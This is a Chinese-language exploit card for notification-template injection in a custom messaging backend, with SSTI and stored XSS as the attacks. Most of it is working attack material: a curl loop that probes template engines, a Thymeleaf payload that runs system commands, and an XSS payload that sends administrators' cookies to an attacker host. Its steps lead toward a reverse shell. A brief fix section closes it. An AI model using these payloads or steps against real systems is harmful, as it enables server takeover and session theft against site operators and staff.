---
title: 通知模板注入（标题/正文模板未转义 → SSTI / 存储型 XSS）
cve: 无（实现缺陷）
severity: critical
cvss: 9.0
product: 自研消息中心（站内信/邮件/短信模板）
versions: 任意
ports: 80, 443
keywords: 模板, ssti, 通知, 站内信, 短信, 注入
entry: 后台模板编辑 / 会员自定义通知标题
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

```
POST /api/admin/message/template  {"title":"${...}","content":"..."}
POST /api/user/notify/test        会员侧"自定义提醒"之类
```

## 前置条件

- 能改模板（后台低权或越权）或能控制模板里的变量。

## PoC

```bash
# 1) 模板表达式探测（Thymeleaf/Freemarker/Velocity 各试） 
for p in '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}' '$!{7*7}'; do
  curl -s -X POST https://target/api/admin/message/template -H "Authorization: Bearer <t>" \
    -H 'Content-Type: application/json' -d "{\"title\":\"t$p\",\"content\":\"c\"}" -o /dev/null
  curl -s https://target/api/user/messages -H "Authorization: Bearer <t>" | grep -o 't[0-9*+]*' | head -3
done
# 判定：回显出现 49 = 该模板引擎未转义（SSTI）

# 2) SSTI → RCE（Thymeleaf 示例）
#   __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
```

```bash
# 3) 若只进 HTML 无表达式：存储型 XSS 打客服/后台
curl -s -X POST https://target/api/admin/message/template -H "Authorization: Bearer <t>" \
  -d '{"title":"<img src=x onerror=fetch(\"//attacker/c?\"+document.cookie)>","content":"x"}'
```

## 利用步骤

1. 先用 7*7 系列探引擎与是否转义；
2. 命中后换 `id` 回显，再换回连；
3. 不能 RCE 就当存储型 XSS 打后台审核页；
4. 证据：模板保存响应 + 消息列表回显。

## 修复与缓解

- 模板变量一律转义；模板编辑限超管并审计；
- 禁用模板引擎的表达式求值（Thymeleaf 关 `spring.thymeleaf.enable-spring-el-compiler` 等）。

## 参考

- OWASP SSTI 防护速查；CWE-1336。
